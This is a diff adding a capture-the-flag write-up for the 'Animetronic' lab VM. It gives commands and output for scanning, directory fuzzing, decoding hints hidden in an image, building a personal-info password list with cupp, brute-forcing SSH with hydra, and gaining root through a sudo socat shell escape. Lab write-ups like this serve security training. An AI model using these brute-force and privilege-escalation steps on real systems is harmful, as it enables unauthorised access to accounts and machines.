@@ -1,1 +1,506 @@
+			ENUMERATION
+
+			
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 345444  bytes 67146462 (64.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 315637  bytes 27765238 (26.4 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 41  bytes 2752 (2.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 41  bytes 2752 (2.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+              
+
+---netdiscover---
+
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                         
+                                                                                                         
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                        
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                        
+ 10.0.2.3        08:00:27:6e:d0:2f      4     240  PCS Systemtechnik GmbH                                
+ 10.0.2.40       08:00:27:b9:af:6e      4     240  PCS Systemtechnik GmbH                                
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                  
+
+
+
+---nmap on target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.40 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 13:13 +03
+Nmap scan report for 10.0.2.40
+Host is up (0.00087s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
+|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Animetronic
+MAC Address: 08:00:27:B9:AF:6E (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.87 ms 10.0.2.40
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.15 seconds
+                          
+
+
+---we see that there are open ssh and http ports, lets do some web enum---
+
+
+---I run dirb and ctfenum, not much to gain, gobuster didnt even show any results. Lets check the website---
+
+
+
+---When we go to the page we recieve a warning that is written with js, so it gives us an idea that 
+we can use js injection for this website---
+
+
+
+---lets run a ffuf scan to fuzz further---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u http://10.0.2.40/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt        
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.40/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+.
+.
+.
+
+                        [Status: 200, Size: 2384, Words: 424, Lines: 53, Duration: 8ms]
+staffpages              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 43ms]
+server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 75ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 1538 req/sec :: Duration: [0:02:25] :: Errors: 0 ::
+                                      
+
+
+---we find a page named staffpages, I go to that page http://10.0.2.40/staffpages/ but we see that we 
+have no permission to be there, but still, we got a new subdomain so lets fuzz the staffpages page too---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u http://10.0.2.40/staffpages/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.40/staffpages/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+.
+.
+.
+
+#                       [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 25ms]
+                        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 16ms]
+new_employees           [Status: 200, Size: 159577, Words: 682, Lines: 728, Duration: 43ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 1550 req/sec :: Duration: [0:02:16] :: Errors: 0 ::
+                          
+
+
+---here we find a page named new_employees within the 10.0.2.40/staffpages domain, lets check the page---
+
+
+---go to http://10.0.2.40/staffpages/new_employees, we see a jpg file here that contains animatronics 
+from FNAF freddy fuzbear---
+
+
+
+---we can download this image into our file and then check the contents of it for further clues---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# wget http://10.0.2.40/staffpages/new_employees
+
+--2024-04-23 14:10:08--  http://10.0.2.40/staffpages/new_employees
+Connecting to 10.0.2.40:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 159577 (156K)
+Saving to: ‘new_employees’
+
+new_employees                  100%[===================================================>] 155.84K  --.-KB/s    in 0.003s  
+
+2024-04-23 14:10:08 (60.1 MB/s) - ‘new_employees’ saved [159577/159577]
+
+              
+
+
+---lets use strings to see the content---
+   
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# strings new_employees                                               
+JFIF
+Mpage for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
+ $.' ",#
+(7),01444
+'9=82<.342
+!22222222222222222222222222222222222222222222222222
+Am[we$
+zXzJ
+T(JT
+.
+.
+.
+
+
+
+---there is an hash of the password that belongs to user michael it looks like, lets go to hashes.com 
+to see what kind of a hash it is---
+
+
+---I checked online hash identifiers but no luck, I wrote this hash into a text file named passhash.txt 
+using its raw form ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo= ---
+
+
+---Then I tried bas64 decoding to see if it will work---
+
+
+                                                                                                                           
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# cat passhash.txt | base64 -d
+ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
+
+
+
+---we found an upside down text that says message_for_michael, lets search for it in the webpage---
+
+
+---go to http://10.0.2.40/staffpages/message_for_michael and we see a text that says---
+
+-----------------
+Hi Michael
+
+Sorry for this complicated way of sending messages between us.
+This is because I assigned a powerful hacker to try to hack
+our server.
+
+By the way, try changing your password because it is easy
+to discover, as it is a mixture of your personal information
+contained in this file 
+
+personal_info.txt
+------------------
+
+
+---I check http://10.0.2.40/staffpages/message_for_michael/personal_info.txt and find nothing, but I check
+http://10.0.2.40/staffpages/personal_info.txt and here I find personal info about michael---
+
+
+--------------------
+name: Michael
+
+age: 27
+
+birth date: 19/10/1996
+
+number of children: 3 " Ahmed - Yasser - Adam "
+
+Hobbies: swimming 
+--------------------
+
+
+---now with the clues we have we can try to bruteforce our way with a wordlist or try to guess the password 
+but that will take long, instead we can use a tool named cupp---
+
+
+cupp: Short for Common User Passwords Profiler.  It is a tool that is used for creating a password wordlist 
+with all the info given to the user. So that the tool can later on crack the easy password. It is used for
+pentesting and forensic crime investigations. 
+You can find it in https://github.com/Mebus/cupp
+
+
+
+---lets download cupp and use it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# cd /opt                                  
+                                                                                                                           
+┌──(root㉿kali)-[/opt]
+└─# git clone https://github.com/Mebus/cupp.git          
+Cloning into 'cupp'...
+remote: Enumerating objects: 237, done.
+remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
+Receiving objects: 100% (237/237), 2.14 MiB | 2.35 MiB/s, done.
+Resolving deltas: 100% (125/125), done.
+                                                                                                                           
+
+
+---instead of puting all the user info in a text file we can just run cupp.py with -i---
+
+
+┌──(root㉿kali)-[/opt/cupp]
+└─# python3 cupp.py -i                                                                         
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: michael
+> Surname: 
+> Nickname: 
+> Birthdate (DDMMYYYY): 10191996
+
+
+> Partners) name: 
+> Partners) nickname: 
+> Partners) birthdate (DDMMYYYY): 
+
+
+> Child's name: 
+> Child's nickname: 
+> Child's birthdate (DDMMYYYY): 
+
+
+> Pet's name: 
+> Company name: 
+
+
+> Do you want to add some key words about the victim? Y/[N]: y
+> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: swimming,ahmed,yasser,adam    
+> Do you want to add special chars at the end of words? Y/[N]: n
+> Do you want to add some random numbers at the end of words? Y/[N]:n
+> Leet mode? (i.e. leet = 1337) Y/[N]: n
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to michael.txt, counting 2626 words.
+> Hyperspeed Print? (Y/n) : n
+[+] Now load your pistolero with michael.txt and shoot! Good luck!
+                                                                                                                           
+┌──(root㉿kali)-[/opt/cupp]
+└─# ls
+CHANGELOG.md  LICENSE  README.md  cupp.cfg  cupp.py  michael.txt  screenshots  test_cupp.py
+                             
+						                                      ----Here it is----
+
+
+
+
+---now lets try to crack the password using a cracking tool, can use john, ncrack, hydra or whatever you want---
+
+
+
+┌──(root㉿kali)-[/opt/cupp]
+└─# hydra -l michael -P michael.txt ssh://10.0.2.40 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-23 14:50:21
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2626 login tries (l:1/p:2626), ~165 tries per task
+[DATA] attacking ssh://10.0.2.40:22/
+[STATUS] 107.00 tries/min, 107 tries in 00:01h, 2522 to do in 00:24h, 13 active
+[STATUS] 92.00 tries/min, 276 tries in 00:03h, 2353 to do in 00:26h, 13 active
+[STATUS] 85.86 tries/min, 601 tries in 00:07h, 2028 to do in 00:24h, 13 active
+[STATUS] 83.40 tries/min, 1251 tries in 00:15h, 1378 to do in 00:17h, 13 active
+[STATUS] 83.20 tries/min, 1664 tries in 00:20h, 965 to do in 00:12h, 13 active
+[STATUS] 83.84 tries/min, 2096 tries in 00:25h, 533 to do in 00:07h, 13 active
+[22][ssh] host: 10.0.2.40   login: michael   password: leahcim1996
+
+
+
+---here we find the password of user michael, it is leahcim1996, lets ssh into it now---
+
+
+
+
+			GAINING FOOTHOLD
+
+			
+┌──(root㉿kali)-[/home/okina]
+└─# ssh michael@10.0.2.40                                               
+The authenticity of host '10.0.2.40 (10.0.2.40)' can't be established.
+ED25519 key fingerprint is SHA256:6amN4h/EjKiHufTd7GABl99uFy+fsL6YXJJRDyzxjGE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.40' (ED25519) to the list of known hosts.
+michael@10.0.2.40's password: 
+
+michael@animetronic:~$ ls
+michael@animetronic:~$ ls -la
+total 28
+drwxr-x--- 3 michael michael 4096 Nov 27 21:03 .
+drwxr-xr-x 4 root    root    4096 Nov 27 18:10 ..
+-rw------- 1 michael michael    5 Nov 27 21:03 .bash_history
+-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 michael michael 3771 Jan  6  2022 .bashrc
+drwx------ 2 michael michael 4096 Nov 27 18:50 .cache
+-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
+
+			
+---now lets look around for some credentials, couldn't find much in michael's folder---
+
+
+michael@animetronic:~$ pwd
+/home/michael
+michael@animetronic:~$ cd ..
+michael@animetronic:/home$ ls
+henry  michael
+michael@animetronic:/home$ cd henry/
+michael@animetronic:/home/henry$ 
+
+
+michael@animetronic:/home/henry$ ls
+Note.txt  user.txt
+
+michael@animetronic:/home/henry$ cat user.txt 
+---First User Flag---
+
+
+
+---lets keep on searching---
+
+---I run sudo -l and check crontab but not much comes---
+
+
+---lets escalate our privileges so we can get more info---
+
+
+			
+
+			PRIVILEGE ESCALATION
+
+
+michael@animetronic:/home/henry$ cat Note.txt 
+if you need my account to do anything on the server,
+you will find my password in file named
+
+aGVucnlwYXNzd29yZC50eHQK
+
+
+---I checked and this file name is encrypted with base64, lets decrypt it---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# echo 'aGVucnlwYXNzd29yZC50eHQK' > henrysfile.txt                          
+                                                                                                                           
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# ls
+animetronic_linux_os_ctf_writeup.txt  henrysfile.txt  new_employees  passhash.txt
+                                                                                                                           
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/ANIMETRONIC LINUX CTF]
+└─# cat henrysfile.txt| base64 -d                        
+henrypassword.txt
+
+
+---lets find it---
+
+
+michael@animetronic:/home/henry$ find / -name henrypassword.txt 2>/dev/null
+/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
+
+michael@animetronic:/home/henry$ cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
+IHateWilliam
+
+michael@animetronic:/home/henry$ su henry
+Password: 
+henry@animetronic:~$ 
+
+
+
+---lets see if henry has any privileges that we can exploit to become root user---
+
+
+henry@animetronic:~$ sudo -l
+Matching Defaults entries for henry on animetronic:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User henry may run the following commands on animetronic:
+    (root) NOPASSWD: /usr/bin/socat
+
+
+
+---a quick visit to gtfobins to find a privilege escalation for socat, I find it---
+
+
+sudo socat stdin exec:/bin/sh
+
+
+---lets run it and become root---
+
+
+henry@animetronic:~$ sudo socat stdin exec:/bin/sh
+whoami
+root
+cd /root
+ls
+root.txt
+cat root.txt
+---Root User Flag---
 
